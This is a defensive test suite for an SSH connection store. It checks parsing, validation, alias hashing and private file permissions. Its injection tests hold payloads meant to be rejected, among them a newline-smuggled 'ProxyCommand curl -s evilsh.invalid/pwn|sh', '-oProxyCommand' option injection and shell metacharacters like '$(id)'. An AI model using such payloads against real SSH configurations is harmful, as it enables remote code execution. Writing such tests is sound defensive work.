import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, statSync, readFileSync, chmodSync } from "fs";
import { tmpdir } from "os";
import {
  parseSshString,
  buildSshString,
  generateSshAlias,
  probeAlias,
  isValidUser,
  isValidHost,
  isValidPort,
  isValidAlias,
  isValidRemotePath,
  isValidIdentityFile,
  loadConnections,
  saveConnection,
  getConnection,
  newSessionId,
  sessionIdFor,
  saveSession,
  loadSession,
  deleteSession,
} from "../../src/config/store";

describe("parseSshString", () => {
  it("parses user@host", () => {
    const result = parseSshString("abc@myhost.com");
    expect(result).toEqual({ user: "abc", host: "myhost.com", port: 22 });
  });

  it("parses user@host:port", () => {
    const result = parseSshString("abc@myhost.com:2222");
    expect(result).toEqual({ user: "abc", host: "myhost.com", port: 2222 });
  });

  it("parses host-only with defaults", () => {
    const result = parseSshString("myserver.example.com");
    expect(result).toEqual({ user: "abc", host: "myserver.example.com", port: 22 });
  });

  it("expands simple hostname as managed subdomain", () => {
    const result = parseSshString("myhost");
    expect(result).toEqual({ user: "abc", host: "ssh-myhost.envhaven.app", port: 22 });
  });

  it("expands shorthand subdomain to managed domain", () => {
    const result = parseSshString("myproject-alice");
    expect(result).toEqual({ user: "abc", host: "ssh-myproject-alice.envhaven.app", port: 22 });
  });

  it("expands shorthand with trailing hyphen", () => {
    const result = parseSshString("abc-xyz-");
    expect(result).toEqual({ user: "abc", host: "ssh-abc-xyz-.envhaven.app", port: 22 });
  });

  it("does not expand if input contains dots (full hostname)", () => {
    const result = parseSshString("ssh-myproject-alice.envhaven.app");
    expect(result).toEqual({ user: "abc", host: "ssh-myproject-alice.envhaven.app", port: 22 });
  });

  it("does not expand if input contains @ (user@host format)", () => {
    const result = parseSshString("abc@myproject-alice");
    expect(result).toEqual({ user: "abc", host: "myproject-alice", port: 22 });
  });

  it("parses an IPv4 address", () => {
    expect(parseSshString("abc@192.168.1.10:2222")).toEqual({ user: "abc", host: "192.168.1.10", port: 2222 });
  });

  it("returns null for invalid input", () => {
    expect(parseSshString("")).toBeNull();
    expect(parseSshString("user@")).toBeNull();
    expect(parseSshString("@host")).toBeNull();
    expect(parseSshString("host with spaces")).toBeNull();
  });

  it("returns null for invalid port", () => {
    expect(parseSshString("user@host:0")).toBeNull();
    expect(parseSshString("user@host:99999")).toBeNull();
    expect(parseSshString("user@host:abc")).toBeNull();
  });

  describe("rejects targets that could write into ~/.ssh/config (H-2)", () => {
    it("rejects the audit's newline payload in the host", () => {
      const payload = "abc@workspace.example.com\n  Host *\n  ProxyCommand curl -s evilsh.invalid/pwn|sh";
      expect(parseSshString(payload)).toBeNull();
    });

    it("rejects a newline in the user", () => {
      expect(parseSshString("abc\n  ProxyCommand touch /tmp/pwned\n@host.example.com")).toBeNull();
    });

    it("rejects a carriage return or tab", () => {
      expect(parseSshString("abc@host.example.com\r  ProxyCommand x")).toBeNull();
      expect(parseSshString("abc@host\texample.com")).toBeNull();
    });

    it("rejects spaces and option-looking values", () => {
      expect(parseSshString("abc@host.example.com ProxyCommand=x")).toBeNull();
      expect(parseSshString("-oProxyCommand=x@host.example.com")).toBeNull();
      expect(parseSshString("abc@-oProxyCommand=x")).toBeNull();
    });

    it("rejects shell and config metacharacters", () => {
      for (const target of ["abc@host;id", "abc@host|sh", "abc@$(id)", "a\"b@host", "abc@host#x", "abc@ho%st"]) {
        expect(parseSshString(target)).toBeNull();
      }
    });
  });
});

describe("validators", () => {
  it("accepts ordinary users and rejects the rest", () => {
    expect(isValidUser("abc")).toBe(true);
    expect(isValidUser("deploy_user.1")).toBe(true);
    expect(isValidUser("-o")).toBe(false);
    expect(isValidUser("a b")).toBe(false);
    expect(isValidUser("a\nb")).toBe(false);
    expect(isValidUser("")).toBe(false);
  });

  it("accepts hostnames and IPv4 and rejects the rest", () => {
    expect(isValidHost("ssh-a-b.envhaven.app")).toBe(true);
    expect(isValidHost("10.0.0.1")).toBe(true);
    expect(isValidHost("my_host")).toBe(true);
    expect(isValidHost("-host")).toBe(false);
    expect(isValidHost("host.")).toBe(false);
    expect(isValidHost("ho st")).toBe(false);
    expect(isValidHost("a".repeat(254))).toBe(false);
  });

  it("accepts integer ports in range only", () => {
    expect(isValidPort(22)).toBe(true);
    expect(isValidPort(65535)).toBe(true);
    expect(isValidPort(0)).toBe(false);
    expect(isValidPort(22.5)).toBe(false);
    expect(isValidPort("22")).toBe(false);
  });

  it("accepts haven aliases only", () => {
    expect(isValidAlias("haven-abc123")).toBe(true);
    expect(isValidAlias(generateSshAlias("host", 22))).toBe(true);
    expect(isValidAlias("-oProxyCommand=x")).toBe(false);
    expect(isValidAlias("haven-x\nHost *")).toBe(false);
    expect(isValidAlias("other")).toBe(false);
  });

  it("requires absolute paths without control characters", () => {
    expect(isValidRemotePath("/config/workspace/my app")).toBe(true);
    expect(isValidRemotePath("relative/path")).toBe(false);
    expect(isValidRemotePath("22:/etc")).toBe(false);
    expect(isValidRemotePath("/a\nb")).toBe(false);
    expect(isValidIdentityFile("/home/u/.ssh/id_ed25519")).toBe(true);
    expect(isValidIdentityFile('/home/u/.ssh/id"x')).toBe(false);
    expect(isValidIdentityFile("~/.ssh/id_ed25519")).toBe(false);
  });
});

describe("buildSshString", () => {
  it("builds user@host for port 22", () => {
    expect(buildSshString({ host: "myhost.com", port: 22, user: "abc", remotePath: "/" }))
      .toBe("abc@myhost.com");
  });

  it("includes port for non-22", () => {
    expect(buildSshString({ host: "myhost.com", port: 2222, user: "abc", remotePath: "/" }))
      .toBe("abc@myhost.com -p 2222");
  });
});

describe("generateSshAlias", () => {
  it("generates consistent aliases", () => {
    const alias1 = generateSshAlias("myhost.com", 2222);
    const alias2 = generateSshAlias("myhost.com", 2222);
    expect(alias1).toBe(alias2);
    expect(alias1.startsWith("haven-")).toBe(true);
  });

  it("generates different aliases for different hosts", () => {
    const alias1 = generateSshAlias("host1.com", 22);
    const alias2 = generateSshAlias("host2.com", 22);
    expect(alias1).not.toBe(alias2);
  });

  it("generates different aliases for different ports", () => {
    const alias1 = generateSshAlias("myhost.com", 22);
    const alias2 = generateSshAlias("myhost.com", 2222);
    expect(alias1).not.toBe(alias2);
  });

  it("generates different aliases for different users on one host and port", () => {
    expect(generateSshAlias("myhost.com", 22, "alice")).not.toBe(generateSshAlias("myhost.com", 22, "bob"));
  });

  it("uses 64 bits of SHA-256 (L-56)", () => {
    expect(generateSshAlias("myhost.com", 22)).toMatch(/^haven-[0-9a-f]{16}$/);
  });

  it("gives each workspace a probe alias that is valid and can be no workspace's own", () => {
    const alias = generateSshAlias("myhost.com", 22);
    const probe = probeAlias(alias);
    expect(isValidAlias(probe)).toBe(true);
    expect(probe).toBe(`haven-probe${alias.slice("haven-".length)}`);
    // Not 16 hex digits after the prefix, and longer than the 7 characters older versions used.
    expect(probe).not.toMatch(/^haven-[0-9a-f]{16}$/);
    expect(probe.length - "haven-".length).toBeGreaterThan(7);
  });
});

describe("connection store on disk", () => {
  let configHome: string;
  const previousXdg = process.env["XDG_CONFIG_HOME"];

  beforeEach(() => {
    configHome = mkdtempSync(`${tmpdir()}/haven-store-`);
    process.env["XDG_CONFIG_HOME"] = configHome;
  });

  afterEach(() => {
    if (previousXdg === undefined) delete process.env["XDG_CONFIG_HOME"];
    else process.env["XDG_CONFIG_HOME"] = previousXdg;
    rmSync(configHome, { recursive: true, force: true });
  });

  const connectionsPath = () => `${configHome}/haven/connections.json`;

  it("writes connections.json and its directory privately (L-11)", () => {
    saveConnection("/projects/app", { host: "h.example.com", port: 22, user: "abc", remotePath: "/config/workspace/app" });
    expect(statSync(connectionsPath()).mode & 0o777).toBe(0o600);
    expect(statSync(`${configHome}/haven`).mode & 0o777).toBe(0o700);
    expect(getConnection("/projects/app")?.host).toBe("h.example.com");
  });

  it("tightens a connections.json an older version wrote world-readable", () => {
    mkdirSync(`${configHome}/haven`, { recursive: true });
    writeFileSync(connectionsPath(), "{}", { mode: 0o644 });
    chmodSync(connectionsPath(), 0o644);
    saveConnection("/projects/app", { host: "h.example.com", port: 22, user: "abc", remotePath: "/w" });
    expect(statSync(connectionsPath()).mode & 0o777).toBe(0o600);
  });

  it("drops entries whose required fields fail validation (L-13)", () => {
    mkdirSync(`${configHome}/haven`, { recursive: true });
    const good = { host: "h.example.com", port: 22, user: "abc", remotePath: "/config/workspace/app", sshAlias: "haven-abc" };
    writeFileSync(connectionsPath(), JSON.stringify({
      "/projects/good": good,
      "/projects/host": { ...good, host: "h.example.com\n  ProxyCommand x" },
      "/projects/port": { ...good, port: "22" },
      "/projects/remote": { ...good, remotePath: "22:/etc" },
      "relative": good,
    }));

    const store = loadConnections();
    expect(Object.keys(store)).toEqual(["/projects/good"]);
    expect(store["/projects/good"]).toEqual(good);
  });

  it("drops only the bad optional field, keeping the connection and its sync findable", () => {
    mkdirSync(`${configHome}/haven`, { recursive: true });
    const base = { host: "h.example.com", port: 22, user: "abc", remotePath: "/config/workspace/app" };
    writeFileSync(connectionsPath(), JSON.stringify({
      "/projects/alias": { ...base, sshAlias: "-oProxyCommand=touch /tmp/pwned", sessionId: "0123456789abcdef" },
      "/projects/key": { ...base, identityFile: "relative/key" },
      "/projects/ignore": { ...base, gitignorePatterns: ["dist/", "bad\tline"] },
      "/projects/rules": { ...base, syncIgnores: ["dist/", 5] },
      "/projects/rules2": { ...base, syncIgnores: "dist/" },
    }));

    const store = loadConnections();
    expect(store["/projects/alias"]).toEqual({ ...base, sessionId: "0123456789abcdef" });
    expect(store["/projects/key"]).toEqual(base);
    expect(store["/projects/ignore"]).toEqual(base);
    expect(store["/projects/rules"]).toEqual(base);
    expect(store["/projects/rules2"]).toEqual(base);
  });

  it("writes back the entries it cannot use instead of deleting them on the next save", () => {
    // An older version accepted a "Remote path" such as ~/proj; dropping that entry on any save
    // lost the only record of a directory whose sync session was still running.
    mkdirSync(`${configHome}/haven`, { recursive: true });
    const good = { host: "h.example.com", port: 22, user: "abc", remotePath: "/config/workspace/app" };
    const older = { ...good, remotePath: "~/proj", sshAlias: "haven-abc" };
    // Written by hand for the "__proto__" key, which an object literal would take as its prototype.
    const entries = JSON.stringify({ "/projects/good": good, "/projects/older": older, "relative": good, "/projects/odd": "not an entry" });
    writeFileSync(connectionsPath(), `${entries.slice(0, -1)},"__proto__":{"host":"x"}}`);

    saveConnection("/projects/new", { ...good, remotePath: "/w" });

    const onDisk = JSON.parse(readFileSync(connectionsPath(), "utf-8"));
    expect(onDisk["/projects/older"]).toEqual(older);
    expect(onDisk["relative"]).toEqual(good);
    expect(onDisk["/projects/odd"]).toBe("not an entry");
    expect(Object.getOwnPropertyDescriptor(onDisk, "__proto__")?.value).toEqual({ host: "x" });
    expect(Object.keys(loadConnections()).sort()).toEqual(["/projects/good", "/projects/new"]);
  });

  it("replaces an entry it cannot use once a valid one is saved for that directory", () => {
    mkdirSync(`${configHome}/haven`, { recursive: true });
    writeFileSync(connectionsPath(), JSON.stringify({ "/projects/app": { host: "h.example.com", port: 22, user: "abc", remotePath: "~/app" } }));
    saveConnection("/projects/app", { host: "h.example.com", port: 22, user: "abc", remotePath: "/config/workspace/app" });
    expect(JSON.parse(readFileSync(connectionsPath(), "utf-8"))["/projects/app"].remotePath).toBe("/config/workspace/app");
  });

  it("keeps the name of a session still to be retired with the connection", () => {
    saveConnection("/projects/app", { host: "h.example.com", port: 22, user: "abc", remotePath: "/w", sessionId: "0123456789abcdef", retiredSessionId: "abc12" });
    expect(getConnection("/projects/app")?.retiredSessionId).toBe("abc12");
  });

  it("keeps the ignore patterns of the last sync session with the connection", () => {
    const syncIgnores = [".git/", "node_modules/", "!.env", ".env/", "*.[pP][eE][mM]", "/notes/deploy\\*key"];
    saveConnection("/projects/app", { host: "h.example.com", port: 22, user: "abc", remotePath: "/w", syncIgnores });
    expect(getConnection("/projects/app")?.syncIgnores).toEqual(syncIgnores);
  });

  it("keeps only known fields from a valid entry", () => {
    mkdirSync(`${configHome}/haven`, { recursive: true });
    writeFileSync(connectionsPath(), JSON.stringify({
      "/projects/app": { host: "h.example.com", port: 22, user: "abc", remotePath: "/w", unexpected: "x" },
    }));
    expect(loadConnections()["/projects/app"]).toEqual({ host: "h.example.com", port: 22, user: "abc", remotePath: "/w" });
  });

  it("names sessions with SHA-256 and keeps legacy ids for older connections (L-56)", () => {
    const config = { host: "h", port: 22, user: "abc", remotePath: "/w" };
    const legacy = sessionIdFor("/projects/app", config);
    expect(legacy).toMatch(/^[0-9a-z]{1,7}$/);
    expect(newSessionId("/projects/app")).toMatch(/^[0-9a-f]{16}$/);
    expect(sessionIdFor("/projects/app", { ...config, sessionId: "0123456789abcdef" })).toBe("0123456789abcdef");
  });

  it("writes session files privately and reads them back", () => {
    saveSession("0123456789abcdef", { connected: true, startTime: 1 });
    const path = `${configHome}/haven/sessions/0123456789abcdef.json`;
    expect(statSync(path).mode & 0o777).toBe(0o600);
    expect(loadSession("0123456789abcdef")).toEqual({ connected: true, startTime: 1 });
    expect(JSON.parse(readFileSync(path, "utf-8")).connected).toBe(true);
    deleteSession("0123456789abcdef");
    expect(loadSession("0123456789abcdef")).toBeNull();
  });

  it("saves a connection whose .gitignore lines held a tab without the bad field", () => {
    saveConnection("/projects/app", {
      host: "h.example.com",
      port: 22,
      user: "abc",
      remotePath: "/w",
      sessionId: "0123456789abcdef",
      gitignorePatterns: ["dist/", "bad\tline"],
    });
    expect(getConnection("/projects/app")).toEqual({
      host: "h.example.com",
      port: 22,
      user: "abc",
      remotePath: "/w",
      sessionId: "0123456789abcdef",
    });
  });

  it("refuses to save a connection whose required fields are invalid", () => {
    expect(() => saveConnection("/projects/app", { host: "bad host", port: 22, user: "abc", remotePath: "/w" })).toThrow();
    expect(getConnection("/projects/app")).toBeNull();
  });

  it("refuses session ids that are not plain names", () => {
    expect(() => saveSession("../escape", { connected: true, startTime: 1 })).toThrow();
    expect(loadSession("../escape")).toBeNull();
  });
});
